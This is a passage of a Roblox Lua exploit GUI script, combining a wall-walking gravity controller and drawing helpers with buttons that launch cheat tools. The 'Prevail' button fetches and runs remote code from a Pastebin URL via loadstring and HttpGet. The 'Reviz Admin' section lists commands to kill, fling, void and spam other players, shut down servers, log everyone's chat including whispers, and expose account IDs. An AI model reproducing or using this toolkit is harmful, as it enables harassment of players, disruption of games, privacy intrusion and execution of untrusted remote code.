			self.AnimationHandler:EnableDefault(false)
			local ssss = game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("SetState") or Instance.new("BindableEvent",game:GetService("Players").LocalPlayer.PlayerScripts)
			local soundState = ExecutedSounds
			ssss.Name = "SetState"

			self.StateTracker = StateTracker.new(self.Humanoid, soundState)
			self.StateTracker.Changed:Connect(function(name, speed)
				self.AnimationHandler:Run(name, speed)
			end)

			-- Collider and forces
			local collider, gyro, vForce, floor = InitObjects(self)

			floor.Touched:Connect(function() end)
			collider.Touched:Connect(function() end)

			self.Collider = collider
			self.VForce = vForce
			self.Gyro = gyro
			self.Floor = floor

			-- Attachment to parts
			self.LastPart = workspace.Terrain
			self.LastPartCFrame = IDENTITYCF

			-- Gravity properties
			self.GravityUp = UNIT_Y
			self.Ignores = {self.Character}

			function self.Camera.GetUpVector(this, oldUpVector)
				return self.GravityUp
			end

			-- Events etc
			self.Humanoid.PlatformStand = true

			self.CharacterMass = getMass(self.Character:GetDescendants())
			self.Character.AncestryChanged:Connect(function() self.CharacterMass = getMass(self.Character:GetDescendants()) end)

			self.JumpCon = RUNSERVICE.RenderStepped:Connect(function(dt) 
				if (self.Controls:IsJumping()) then
					self:OnJumpRequest()
				end
			end)

			self.DeathCon = self.Humanoid.Died:Connect(function() self:Destroy() end)
			self.SeatCon = self.Humanoid.Seated:Connect(function(active) if (active) then self:Destroy() end end)
			self.HeartCon = RUNSERVICE.Heartbeat:Connect(function(dt) self:OnHeartbeatStep(dt) end)
			RUNSERVICE:BindToRenderStep("GravityStep", Enum.RenderPriority.Input.Value + 1, function(dt) self:OnGravityStep(dt) end)


			return self
		end

		-- Public Methods

		function GravityController:Destroy()
			self.JumpCon:Disconnect()
			self.DeathCon:Disconnect()
			self.SeatCon:Disconnect()
			self.HeartCon:Disconnect()

			RUNSERVICE:UnbindFromRenderStep("GravityStep")

			self.Collider:Destroy()
			self.VForce:Destroy()
			self.Gyro:Destroy()
			self.StateTracker:Destroy()

			self.Humanoid.PlatformStand = false
			self.AnimationHandler:EnableDefault(true)

			self.GravityUp = UNIT_Y
		end

		function GravityController:GetGravityUp(oldGravity)
			return oldGravity
		end

		function GravityController:IsGrounded(isJumpCheck)
			if (not isJumpCheck) then
				local parts = self.Floor:GetTouchingParts()
				for _, part in next, parts do
					if (not part:IsDescendantOf(self.Character)) then
						return true
					end
				end
			else
				if (self.StateTracker.Jumped) then
					return false
				end

				-- 1. check we are touching something with the collider
				local valid = {}
				local parts = self.Collider:GetTouchingParts()
				for _, part in next, parts do
					if (not part:IsDescendantOf(self.Character)) then
						table.insert(valid, part)
					end
				end

				if (#valid > 0) then
					-- 2. do a decently long downwards raycast
					local max = math.cos(self.Humanoid.MaxSlopeAngle)
					local ray = Ray.new(self.Collider.Position, -10 * self.GravityUp)
					local hit, pos, normal = workspace:FindPartOnRayWithWhitelist(ray, valid, true)

					-- 3. use slope to decide on jump
					if (hit and max <= self.GravityUp:Dot(normal)) then
						return true
					end
				end
			end
			return false
		end

		function GravityController:OnJumpRequest()
			if (not self.StateTracker.Jumped and self:IsGrounded(true)) then
				local hrpVel = self.HRP.Velocity
				self.HRP.Velocity = hrpVel + self.GravityUp*self.Humanoid.JumpPower*JUMPMODIFIER
				self.StateTracker:RequestedJump()
			end
		end

		function GravityController:GetMoveVector()
			return self.Controls:GetMoveVector()
		end

		function GravityController:OnHeartbeatStep(dt)
			local ray = Ray.new(self.Collider.Position, -1.1*self.GravityUp)
			local hit, pos, normal = workspace:FindPartOnRayWithIgnoreList(ray, self.Ignores)
			local lastPart = self.LastPart

			if (hit and lastPart and lastPart == hit) then
				local offset = self.LastPartCFrame:ToObjectSpace(self.HRP.CFrame)
				self.HRP.CFrame = hit.CFrame:ToWorldSpace(offset)
			end

			self.LastPart = hit
			self.LastPartCFrame = hit and hit.CFrame
		end

		function GravityController:OnGravityStep(dt)
			-- update gravity up vector
			local oldGravity = self.GravityUp
			local newGravity = self:GetGravityUp(oldGravity)

			local rotation = getRotationBetween(oldGravity, newGravity, workspace.CurrentCamera.CFrame.RightVector)
			rotation = IDENTITYCF:Lerp(rotation, TRANSITION)

			self.GravityUp = rotation * oldGravity

			-- get world move vector
			local camCF = workspace.CurrentCamera.CFrame
			local fDot = camCF.LookVector:Dot(newGravity)
			local cForward = math.abs(fDot) > 0.5 and -math.sign(fDot)*camCF.UpVector or camCF.LookVector

			local left = cForward:Cross(-newGravity).Unit
			local forward = -left:Cross(newGravity).Unit

			local move = self:GetMoveVector()
			local worldMove = forward*move.z - left*move.x
			worldMove = worldMove:Dot(worldMove) > 1 and worldMove.Unit or worldMove

			local isInputMoving = worldMove:Dot(worldMove) > 0

			-- get the desired character cframe
			local hrpCFLook = self.HRP.CFrame.LookVector
			local charF = hrpCFLook:Dot(forward)*forward + hrpCFLook:Dot(left)*left
			local charR = charF:Cross(newGravity).Unit
			local newCharCF = CFrame.fromMatrix(ZERO, charR, newGravity, -charF)

			local newCharRotation = IDENTITYCF
			if (isInputMoving) then
				newCharRotation = IDENTITYCF:Lerp(getRotationBetween(charF, worldMove, newGravity), 0.7)	
			end

			-- calculate forces
			local g = workspace.Gravity
			local gForce = g * self.CharacterMass * (UNIT_Y - newGravity)

			local cVelocity = self.HRP.Velocity
			local tVelocity = self.Humanoid.WalkSpeed * worldMove
			local gVelocity = cVelocity:Dot(newGravity)*newGravity
			local hVelocity = cVelocity - gVelocity

			if (hVelocity:Dot(hVelocity) < 1) then
				hVelocity = ZERO
			end

			local dVelocity = tVelocity - hVelocity
			local walkForceM = math.min(10000, WALKF * self.CharacterMass * dVelocity.Magnitude / (dt*60))
			local walkForce = walkForceM > 0 and dVelocity.Unit*walkForceM or ZERO

			-- mouse lock
			local charRotation = newCharRotation * newCharCF

			if (self.Camera:IsCamRelative()) then
				local lv = workspace.CurrentCamera.CFrame.LookVector
				local hlv = lv - charRotation.UpVector:Dot(lv)*charRotation.UpVector
				charRotation = lookAt(ZERO, hlv, charRotation.UpVector)
			end

			-- get state
			self.StateTracker:OnStep(self.GravityUp, self:IsGrounded(), isInputMoving)

			-- update values
			self.VForce.Force = walkForce + gForce
			self.Gyro.CFrame = charRotation
		end
		return GravityController
	end
	function _Draw3D()
		local module = {}

		-- Style Guide

		module.StyleGuide = {
			Point = {
				Thickness = 0.5;
				Color = Color3.new(0, 1, 0);
			},

			Line = {
				Thickness = 0.1;
				Color = Color3.new(1, 1, 0);
			},

			Ray = {
				Thickness = 0.1;
				Color = Color3.new(1, 0, 1);
			},

			Triangle = {
				Thickness = 0.05;
			};

			CFrame = {
				Thickness = 0.1;
				RightColor3 = Color3.new(1, 0, 0);
				UpColor3 = Color3.new(0, 1, 0);
				BackColor3 = Color3.new(0, 0, 1);
				PartProperties = {
					Material = Enum.Material.SmoothPlastic;
				};
			}
		}

		-- CONSTANTS

		local WEDGE = Instance.new("WedgePart")
		WEDGE.Material = Enum.Material.SmoothPlastic
		WEDGE.Anchored = true
		WEDGE.CanCollide = false

		local PART = Instance.new("Part")
		PART.Size = Vector3.new(0.1, 0.1, 0.1)
		PART.Anchored = true
		PART.CanCollide = false
		PART.TopSurface = Enum.SurfaceType.Smooth
		PART.BottomSurface = Enum.SurfaceType.Smooth
		PART.Material = Enum.Material.SmoothPlastic

		-- Functions

		local function draw(properties, style)
			local part = PART:Clone()
			for k, v in next, properties do
				part[k] = v
			end
			if (style) then
				for k, v in next, style do
					if (k ~= "Thickness") then
						part[k] = v
					end
				end
			end
			return part
		end

		function module.Draw(parent, properties)
			properties.Parent = parent
			return draw(properties, nil)
		end

		function module.Point(parent, cf_v3)
			local thickness = module.StyleGuide.Point.Thickness
			return draw({
				Size = Vector3.new(thickness, thickness, thickness);
				CFrame = (typeof(cf_v3) == "CFrame" and cf_v3 or CFrame.new(cf_v3));
				Parent = parent;
			}, module.StyleGuide.Point)
		end

		function module.Line(parent, a, b)
			local thickness = module.StyleGuide.Line.Thickness
			return draw({
				CFrame = CFrame.new((a + b)/2, b);
				Size = Vector3.new(thickness, thickness, (b - a).Magnitude);
				Parent = parent;
			}, module.StyleGuide.Line)
		end

		function module.Ray(parent, origin, direction)
			local thickness = module.StyleGuide.Ray.Thickness
			return draw({
				CFrame = CFrame.new(origin + direction/2, origin + direction);
				Size = Vector3.new(thickness, thickness, direction.Magnitude);
				Parent = parent;
			}, module.StyleGuide.Ray)
		end

		function module.Triangle(parent, a, b, c)
			local ab, ac, bc = b - a, c - a, c - b
			local abd, acd, bcd = ab:Dot(ab), ac:Dot(ac), bc:Dot(bc)

			if (abd > acd and abd > bcd) then
				c, a = a, c
			elseif (acd > bcd and acd > abd) then
				a, b = b, a
			end

			ab, ac, bc = b - a, c - a, c - b

			local right = ac:Cross(ab).Unit
			local up = bc:Cross(right).Unit
			local back = bc.Unit

			local height = math.abs(ab:Dot(up))
			local width1 = math.abs(ab:Dot(back))
			local width2 = math.abs(ac:Dot(back))

			local thickness = module.StyleGuide.Triangle.Thickness

			local w1 = WEDGE:Clone()
			w1.Size = Vector3.new(thickness, height, width1)
			w1.CFrame = CFrame.fromMatrix((a + b)/2, right, up, back)
			w1.Parent = parent

			local w2 = WEDGE:Clone()
			w2.Size = Vector3.new(thickness, height, width2)
			w2.CFrame = CFrame.fromMatrix((a + c)/2, -right, up, -back)
			w2.Parent = parent

			for k, v in next, module.StyleGuide.Triangle do
				if (k ~= "Thickness") then
					w1[k] = v
					w2[k] = v
				end
			end

			return w1, w2
		end

		function module.CFrame(parent, cf)
			local origin = cf.Position
			local r = cf.RightVector
			local u = cf.UpVector
			local b = -cf.LookVector

			local thickness = module.StyleGuide.CFrame.Thickness

			local right = draw({
				CFrame = CFrame.new(origin + r/2, origin + r);
				Size = Vector3.new(thickness, thickness, r.Magnitude);
				Color = module.StyleGuide.CFrame.RightColor3;
				Parent = parent;
			}, module.StyleGuide.CFrame.PartProperties)

			local up = draw({
				CFrame = CFrame.new(origin + u/2, origin + u);
				Size = Vector3.new(thickness, thickness, r.Magnitude);
				Color = module.StyleGuide.CFrame.UpColor3;
				Parent = parent;
			}, module.StyleGuide.CFrame.PartProperties)

			local back = draw({
				CFrame = CFrame.new(origin + b/2, origin + b);
				Size = Vector3.new(thickness, thickness, u.Magnitude);
				Color = module.StyleGuide.CFrame.BackColor3;
				Parent = parent;
			}, module.StyleGuide.CFrame.PartProperties)

			return right, up, back
		end

		-- Return

		return module
	end
	function _Draw2D()
		local module = {}

		-- Style Guide

		module.StyleGuide = {
			Point = {
				BorderSizePixel = 0;
				Size = UDim2.new(0, 4, 0, 4);
				BorderColor3 = Color3.new(0, 0, 0);
				BackgroundColor3 = Color3.new(0, 1, 0);
			},

			Line = {
				Thickness = 1;
				BorderSizePixel = 0;
				BorderColor3 = Color3.new(0, 0, 0);
				BackgroundColor3 = Color3.new(0, 1, 0);
			},

			Ray = {
				Thickness = 1;
				BorderSizePixel = 0;
				BorderColor3 = Color3.new(0, 0, 0);
				BackgroundColor3 = Color3.new(0, 1, 0);
			},

			Triangle = {
				ImageTransparency = 0;
				ImageColor3 = Color3.new(0, 1, 0);
			}
		}

		-- CONSTANTS

		local HALF = Vector2.new(0.5, 0.5)

		local RIGHT = "rbxassetid://2798177521"
		local LEFT = "rbxassetid://2798177955"

		local IMG = Instance.new("ImageLabel")
		IMG.BackgroundTransparency = 1
		IMG.AnchorPoint = HALF
		IMG.BorderSizePixel = 0

		local FRAME = Instance.new("Frame")
		FRAME.BorderSizePixel = 0
		FRAME.Size = UDim2.new(0, 0, 0, 0)
		FRAME.BackgroundColor3 = Color3.new(1, 1, 1)

		-- Functions

		function draw(properties, style)
			local frame = FRAME:Clone()
			for k, v in next, properties do
				frame[k] = v
			end
			if (style) then
				for k, v in next, style do
					if (k ~= "Thickness") then
						frame[k] = v
					end
				end
			end
			return frame
		end

		function module.Draw(parent, properties)
			properties.Parent = parent
			return draw(properties, nil)
		end

		function module.Point(parent, v2)
			return draw({
				AnchorPoint = HALF;
				Position = UDim2.new(0, v2.x, 0, v2.y);
				Parent = parent;
			}, module.StyleGuide.Point)
		end

		function module.Line(parent, a, b)
			local v = (b - a)
			local m = (a + b)/2

			return draw({
				AnchorPoint = HALF;
				Position = UDim2.new(0, m.x, 0, m.y);
				Size = UDim2.new(0, module.StyleGuide.Line.Thickness, 0, v.magnitude);
				Rotation = math.deg(math.atan2(v.y, v.x)) - 90;
				BackgroundColor3 = Color3.new(1, 1, 0);
				Parent = parent;
			}, module.StyleGuide.Line)
		end

		function module.Ray(parent, origin, direction)
			local a, b = origin, origin + direction
			local v = (b - a)
			local m = (a + b)/2

			return draw({
				AnchorPoint = HALF;
				Position = UDim2.new(0, m.x, 0, m.y);
				Size = UDim2.new(0, module.StyleGuide.Ray.Thickness, 0, v.magnitude);
				Rotation = math.deg(math.atan2(v.y, v.x)) - 90;
				Parent = parent;
			}, module.StyleGuide.Ray)
		end

		function module.Triangle(parent, a, b, c)
			local ab, ac, bc = b - a, c - a, c - b
			local abd, acd, bcd = ab:Dot(ab), ac:Dot(ac), bc:Dot(bc)

			if (abd > acd and abd > bcd) then
				c, a = a, c
			elseif (acd > bcd and acd > abd) then
				a, b = b, a
			end

			ab, ac, bc = b - a, c - a, c - b

			local unit = bc.unit
			local height = unit:Cross(ab)
			local flip = (height >= 0)
			local theta = math.deg(math.atan2(unit.y, unit.x)) + (flip and 0 or 180)

			local m1 = (a + b)/2
			local m2 = (a + c)/2

			local w1 = IMG:Clone()
			w1.Image = flip and RIGHT or LEFT
			w1.AnchorPoint = HALF
			w1.Size = UDim2.new(0, math.abs(unit:Dot(ab)), 0, height)
			w1.Position = UDim2.new(0, m1.x, 0, m1.y)
			w1.Rotation = theta
			w1.Parent = parent

			local w2 = IMG:Clone()
			w2.Image = flip and LEFT or RIGHT
			w2.AnchorPoint = HALF
			w2.Size = UDim2.new(0, math.abs(unit:Dot(ac)), 0, height)
			w2.Position = UDim2.new(0, m2.x, 0, m2.y)
			w2.Rotation = theta
			w2.Parent = parent

			for k, v in next, module.StyleGuide.Triangle do
				w1[k] = v
				w2[k] = v
			end

			return w1, w2
		end

		-- Return

		return module
	end
	function _DrawClass()
		local Draw2DModule = _Draw2D()
		local Draw3DModule = _Draw3D()

		--

		local DrawClass = {}
		local DrawClassStorage = setmetatable({}, {__mode = "k"})
		DrawClass.__index = DrawClass

		function DrawClass.new(parent)
			local self = setmetatable({}, DrawClass)

			self.Parent = parent
			DrawClassStorage[self] = {}

			self.Draw3D = {}
			for key, func in next, Draw3DModule do
				self.Draw3D[key] = function(...)
					local returns = {func(self.Parent, ...)}
					for i = 1, #returns do
						table.insert(DrawClassStorage[self], returns[i])
					end
					return unpack(returns)
				end
			end

			self.Draw2D = {}
			for key, func in next, Draw2DModule do
				self.Draw2D[key] = function(...)
					local returns = {func(self.Parent, ...)}
					for i = 1, #returns do
						table.insert(DrawClassStorage[self], returns[i])
					end
					return unpack(returns)
				end
			end

			return self
		end

		--

		function DrawClass:Clear()
			local t = DrawClassStorage[self]
			while (#t > 0) do
				local part = table.remove(t)
				if (part) then
					part:Destroy()
				end
			end
			DrawClassStorage[self] = {}
		end

		--

		return DrawClass
	end


	--END TEST

	local PLAYERS = game:GetService("Players")

	local GravityController = _GravityController()
	local Controller = GravityController.new(PLAYERS.LocalPlayer)

	local DrawClass = _DrawClass()

	local PI2 = math.pi*2
	local ZERO = Vector3.new(0, 0, 0)

	local LOWER_RADIUS_OFFSET = 3 
	local NUM_DOWN_RAYS = 24
	local ODD_DOWN_RAY_START_RADIUS = 3	
	local EVEN_DOWN_RAY_START_RADIUS = 2
	local ODD_DOWN_RAY_END_RADIUS = 1.66666
	local EVEN_DOWN_RAY_END_RADIUS = 1

	local NUM_FEELER_RAYS = 9
	local FEELER_LENGTH = 2
	local FEELER_START_OFFSET = 2
	local FEELER_RADIUS = 3.5
	local FEELER_APEX_OFFSET = 1
	local FEELER_WEIGHTING = 8

	function GetGravityUp(self, oldGravityUp)
		local ignoreList = {}
		for i, player in next, PLAYERS:GetPlayers() do
			ignoreList[i] = player.Character
		end

		-- get the normal

		local hrpCF = self.HRP.CFrame
		local isR15 = (self.Humanoid.RigType == Enum.HumanoidRigType.R15)

		local origin = isR15 and hrpCF.p or hrpCF.p + 0.35*oldGravityUp
		local radialVector = math.abs(hrpCF.LookVector:Dot(oldGravityUp)) < 0.999 and hrpCF.LookVector:Cross(oldGravityUp) or hrpCF.RightVector:Cross(oldGravityUp)

		local centerRayLength = 25
		local centerRay = Ray.new(origin, -centerRayLength * oldGravityUp)
		local centerHit, centerHitPoint, centerHitNormal = workspace:FindPartOnRayWithIgnoreList(centerRay, ignoreList)

	--[[disable
	DrawClass:Clear()
	DrawClass.Draw3D.Ray(centerRay.Origin, centerRay.Direction)
	]]
		local downHitCount = 0
		local totalHitCount = 0
		local centerRayHitCount = 0
		local evenRayHitCount = 0
		local oddRayHitCount = 0

		local mainDownNormal = ZERO
		if (centerHit) then
			mainDownNormal = centerHitNormal
			centerRayHitCount = 0
		end

		local downRaySum = ZERO
		for i = 1, NUM_DOWN_RAYS do
			local dtheta = PI2 * ((i-1)/NUM_DOWN_RAYS)

			local angleWeight = 0.25 + 0.75 * math.abs(math.cos(dtheta))
			local isEvenRay = (i%2 == 0)
			local startRadius = isEvenRay and EVEN_DOWN_RAY_START_RADIUS or ODD_DOWN_RAY_START_RADIUS	
			local endRadius = isEvenRay and EVEN_DOWN_RAY_END_RADIUS or ODD_DOWN_RAY_END_RADIUS
			local downRayLength = centerRayLength

			local offset = CFrame.fromAxisAngle(oldGravityUp, dtheta) * radialVector
			local dir = (LOWER_RADIUS_OFFSET * -oldGravityUp + (endRadius - startRadius) * offset)
			local ray = Ray.new(origin + startRadius * offset, downRayLength * dir.unit)
			local hit, hitPoint, hitNormal = workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
		--[[disable
		DrawClass.Draw3D.Ray(ray.Origin, ray.Direction)
		]]
			if (hit) then
				downRaySum = downRaySum + angleWeight * hitNormal
				downHitCount = downHitCount + 1
				if isEvenRay then
					evenRayHitCount = evenRayHitCount + 1					
				else
					oddRayHitCount = oddRayHitCount + 1
				end
			end
		end

		local feelerHitCount = 0	
		local feelerNormalSum = ZERO

		for i = 1, NUM_FEELER_RAYS do
			local dtheta = 2 * math.pi * ((i-1)/NUM_FEELER_RAYS)
			local angleWeight =  0.25 + 0.75 * math.abs(math.cos(dtheta))	
			local offset = CFrame.fromAxisAngle(oldGravityUp, dtheta) * radialVector
			local dir = (FEELER_RADIUS * offset + LOWER_RADIUS_OFFSET * -oldGravityUp).unit
			local feelerOrigin = origin - FEELER_APEX_OFFSET * -oldGravityUp + FEELER_START_OFFSET * dir
			local ray = Ray.new(feelerOrigin, FEELER_LENGTH * dir)
			local hit, hitPoint, hitNormal = workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
		--[[disable
		DrawClass.Draw3D.Ray(ray.Origin, ray.Direction)
		]]
			if (hit) then
				feelerNormalSum = feelerNormalSum + FEELER_WEIGHTING * angleWeight * hitNormal --* hitDistSqInv
				feelerHitCount = feelerHitCount + 1
			end
		end

		if (centerRayHitCount + downHitCount + feelerHitCount > 0) then
			local normalSum = mainDownNormal + downRaySum + feelerNormalSum
			if (normalSum ~= ZERO) then
				return normalSum.unit
			end
		end

		return oldGravityUp
	end

	Controller.GetGravityUp = GetGravityUp

	-- E is toggle
	game:GetService("ContextActionService"):BindAction("Toggle", function(action, state, input)
		if not (state == Enum.UserInputState.Begin) then
			return
		end

		if (Controller) then
			Controller:Destroy()
			Controller = nil
		else
			Controller = GravityController.new(PLAYERS.LocalPlayer)
			Controller.GetGravityUp = GetGravityUp
		end
	end, false, Enum.KeyCode.Z)
	print("end")
end)

UICorner_48.Parent = WalkWalls

Prevail.Name = "Prevail"
Prevail.Parent = Scripts
Prevail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Prevail.Position = UDim2.new(0.565737069, 0, 0.586028755, 0)
Prevail.Size = UDim2.new(0, 71, 0, 50)
Prevail.Font = Enum.Font.SciFi
Prevail.Text = "Prevail"
Prevail.TextColor3 = Color3.fromRGB(0, 0, 0)
Prevail.TextScaled = true
Prevail.TextSize = 14.000
Prevail.TextWrapped = true
Prevail.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
end)

UICorner_49.Parent = Prevail

RevizAdmin.Name = "RevizAdmin"
RevizAdmin.Parent = Scripts
RevizAdmin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RevizAdmin.Position = UDim2.new(0.282868534, 0, 0.585184872, 0)
RevizAdmin.Size = UDim2.new(0, 71, 0, 50)
RevizAdmin.Font = Enum.Font.SciFi
RevizAdmin.Text = "Reviz Admin"
RevizAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
RevizAdmin.TextScaled = true
RevizAdmin.TextSize = 14.000
RevizAdmin.TextWrapped = true
RevizAdmin.MouseButton1Click:connect(function()
	-- Creator: illremember#3799

	-- Credits to infinite yield, harkinian, dex creators

	prefix = ";"
	wait(0.3)
	Commands = {
		'[-] cmdbar is shown when ; is pressed.',
		'[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player',
		'[2] bring [plr] -- You need a tool! Will bring player to you',
		'[3] spin [plr] -- You need a tool! Makes you and the player spin crazy',
		'[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting',
		'[5] attach [plr] -- You need a tool! Attaches you to player',
		'[6] unattach [plr] -- Attempts to unattach you from a player',
		'[7] follow [plr] -- Makes you follow behind the player',
		'[8] unfollow',
		'[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air',
		'[10] trail [plr] -- The opposite of follow, you stay infront of player',
		'[11] untrail',
		'[12] orbit [plr] -- Makes you orbit the player',
		'[13] unorbit',
		'[14] fling [plr] -- Makes you fling the player',
		'[15] unfling',
		'[16] fecheck -- Checks if the game is FE or not',
		'[17] void [plr] -- Teleports player to the void',
		'[18] noclip -- Gives you noclip to walk through walls',
		'[19] clip -- Removes noclip',
		'[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default',
		'[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default',
		'[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default',
		'[23] default -- Changes your speed, jumppower and hipheight to default values',
		'[24] annoy [plr] -- Loop teleports you to the player',
		'[25] unannoy',
		'[26] headwalk [plr] -- Loop teleports you to the player head',
		'[27] unheadwalk',
		'[28] nolimbs -- Removes your arms and legs',
		'[29] god -- Gives you FE Godmode',
		'[30] drophats -- Drops your accessories',
		'[31] droptool -- Drops any tool you have equipped',
		'[32] loopdhats -- Loop drops your accessories',
		'[33] unloopdhats',
		'[34] loopdtool -- Loop drops any tools you have equipped',
		'[35] unloopdtool',
		'[36] invisible -- Gives you invisibility CREDIT TO TIMELESS',
		'[37] view [plr] -- Changes your camera to the player character',
		'[38] unview',
		'[39] goto [plr] -- Teleports you to player',
		'[40] fly -- Allows you to fly, credit to Infinite Yield',
		'[41] unfly',
		'[42] chat [msg] -- Makes you chat a message',
		'[43] spam [msg] -- Spams a message',
		'[44] unspam',
		'[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second',
		'[46] pmspam [plr] -- Spams a player in private message',
		'[47] unpmspam',
		'[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you',
		'[49] uncfreeze [plr]',
		'[50] unlockws -- Unlocks the workspace',
		'[51] lockws -- Locks the workspace',
		'[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you',
		'[53] pstand -- Enables platform stand',
		'[54] unpstand -- Disables platform stand',
		'[55] blockhead -- Removes your head mesh',
		'[56] sit',
		'[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name',
		'[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided',
		'[59] hypertotal -- Loads in my FE GUI Hypertotal',
		'[60] cmds -- Prints all commands',
		'[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats',
		'[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool',
		'[63] spinner -- Makes you spin',
		'[64] nospinner',
		'[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom',
		'[66] noreach -- Removes reach, must have tool equipped',
		'[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying',
		'[68] tp me [plr] -- Alternative to goto',
		'[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player',
		'[70] uncbring',
		'[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players',
		'[72] givetool [plr] -- Gives the tool you have equipped to the player',
		'[73] glitch [plr] -- Glitches you and the player, looks very cool',
		'[74] unglitch -- Unglitches you',
		'[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode',
		'[76] explorer -- Loads up DEX',
		'[77] reset -- Resets your character.',
		'[78] anim [id] -- Applies an animation on you, must be created by ROBLOX',
		'[79] animgui -- Loads up Energize animations GUI',
		'[80] savepos -- Saves your current position',
		'[81] loadpos -- Teleports you to your saved position',
		'[82] bang [plr] -- 18+ will not work if you have FE Godmode on',
		'[83] unbang',
		'[84] delcmdbar -- Removes the command bar completely',
		'[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model',
		'[86] shutdown -- Uses harkinians script to shutdown server',
		'[87] respawn -- If grespawn doesnt work you can use respawn',
		'[88] delobj [obj] -- Deletes a certain brick in workspace, client sided',
		'[89] getplrs -- Prints all players in game',
		'[90] deldecal -- Deletes all decals client sided',
		'[91] opfinality -- Loads in my FE GUI Opfinality',
		'[92] remotes -- Prints all remotes in the game in the console when added',
		'[93] noremotes -- Stops printing remotes',
		'[94] tpdefault -- Stops all loop teleports to a player',
		'[95] stopsit -- Will not allow you to sit',
		'[96] gosit -- Allows you to sit',
		'[97] clicktp -- Enables click tp',
		'[98] noclicktp -- Disables click tp',
		'[99] toolson -- If any tools are dropped in the workspace you will automatically get them',
		'[100] toolsoff -- Stops ;toolson',
		'[101] version -- Gets the admin version',
		'[102] state [num] -- Changes your humanoid state, ;unstate to stop.',
		'[103] gravity [num] -- Changes workspace gravity default is 196.2',
		'[104] pgs -- Checks if the game has PGSPhysicsSolverEnabled enabled',
		'[105] clickdel -- Delete any block you press q on, client sided',
		'[106] noclickdel -- Stops clickdel',
		'[107] looprhats -- Loop removes mesh of your hats/loop block hats',
		'[108] unlooprhats -- Stops loop removing mesh',
		'[109] looprtool -- Loop removes mesh of your tool/loop block tools',
		'[110] unlooprtool -- Stops loop removing mesh',
		'[111] givealltools [plr] -- Gives all the tools you have in your backpack to the player',
		'[112] age [plr] -- Makes you chat the account age of the player',
		'[113] id [plr] -- Makes you chat the account ID of the player',
		'[114] .age [plr] -- Privately shows you the account age of the player',
		'[115] .id [plr] -- Privately shows you the account ID of the player',
		'[116] gameid -- Shows the game ID',
		'[117] removeinvis -- Removes all invisible walls/parts, client sided',
		'[118] removefog -- Removes fog, client sided',
		'[119] disable -- Disables your character by removing humanoid',
		'[120] enable -- Enables your character by adding humanoid',
		'[121] prefix [key] -- Changes the prefix used, default is ;',
		'[122] ;resetprefix -- Resets the prefix to ; incase you change it to an unusable prefix. Say exactly ";resetprefix" to do this command, no matter what your prefix is set to.',
		'[123] flyspeed [num] -- Change your fly speed, default is 1',
		'[124] carpet [plr] -- Makes you a carpet for a player, will not work if FE Godmode is on',
		'[125] uncarpet -- Stops carpet player',
		'[126] stare [plr] -- Turns your character to stare at another player',
		'[127] unstare -- Stops stare player',
		'[128] logchat -- Logs all chat (including /e and whispers) of all players',
		'[129] unlogchat -- Disables logchat',
		'[130] fixcam -- Fixes/resets your camera',
		'[131] unstate -- Stops changing state',
	}
	speedget = 1

	lplayer = game:GetService("Players").LocalPlayer

	lplayer.CharacterAdded:Connect(function(character)
		spin = false
		flying = false
		staring = false
		banpl = false
	end)

	function change()
		prefix = prefix
		speedfly = speedfly
	end

	function GetPlayer(String) -- Credit to Timeless/xFunnieuss
		local Found = {}
		local strl = String:lower()
		if strl == "all" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				table.insert(Found,v)
			end
		elseif strl == "others" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= lplayer.Name then
					table.insert(Found,v)
				end
			end   
		elseif strl == "me" then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name == lplayer.Name then
					table.insert(Found,v)
				end
			end  
		else
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					table.insert(Found,v)
				end
			end    
		end
		return Found    
	end

	local Mouse = lplayer:GetMouse()

	spin = false
	followed = false
	traill = false
	noclip = false
	annoying = false
	hwalk = false
	droppinghats = false
	droppingtools = false
	flying = false
	spamdelay = 1
	spamming = false
	spammingpm = false
	cbringing = false
	remotes = true
	added = true
	binds = false
	stopsitting = false
	clickgoto = false
	gettingtools = false
	removingmeshhats = false
	removingmeshtool = false
	clickdel = false
	staring = false
	chatlogs = false
	banpl = false
	changingstate = false
	statechosen = 0

	adminversion = "Reviz Admin by illremember, Version 2.0"

	flying = false
	speedfly = 1

	function plrchat(plr, chat)
		print(plr.Name..": "..tick().."\n"..chat)
	end

	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		v.Chatted:connect(function(chat)
			if chatlogs then
				plrchat(v, chat)
			end
		end)
	end
	game:GetService("Players").PlayerAdded:connect(function(plr)
		plr.Chatted:connect(function(chat)
			if chatlogs then
				plrchat(plr, chat)
			end
		end)
	end)


	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
